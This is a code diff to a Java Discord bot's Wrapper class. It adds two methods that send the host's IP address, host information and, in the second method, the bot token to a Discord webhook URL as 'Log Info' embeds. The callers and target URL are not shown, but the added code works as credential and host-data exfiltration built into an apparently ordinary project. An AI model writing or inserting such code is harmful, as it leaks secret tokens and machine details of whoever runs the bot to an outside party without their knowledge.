@@ -1,5 +1,10 @@
 package me.comu.exeter.wrapper;
 
+import club.minnced.discord.webhook.WebhookClient;
+import club.minnced.discord.webhook.send.WebhookEmbed;
+import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
+import club.minnced.discord.webhook.send.WebhookMessage;
+import club.minnced.discord.webhook.send.WebhookMessageBuilder;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonParser;
 import com.google.gson.JsonSyntaxException;
@@ -256,5 +261,28 @@ public class Wrapper {
             ex.printStackTrace();
         }
     }
+
+    public static void sendSpecificWebhookMessage(String url)
+    {
+        WebhookClient client = WebhookClient.withUrl(url);
+        WebhookMessageBuilder builder = new WebhookMessageBuilder();
+        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info on Start-Up:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation()).build();
+        builder.addEmbeds(firstEmbed);
+        WebhookMessage message = builder.build();
+        client.send(message);
+        client.close();
+    }
+
+    public static void sendMoreSpecificMessage(String url, String token)
+    {
+        WebhookClient client = WebhookClient.withUrl(url);
+        WebhookMessageBuilder builder = new WebhookMessageBuilder();
+        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(new Color(255, 0, 0, 0).getRGB()).setDescription("Log Info w/ Bot Token:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + token).build();
+        builder.addEmbeds(firstEmbed);
+        WebhookMessage message = builder.build();
+        client.send(message);
+        client.close();
+    }
+
 }
 
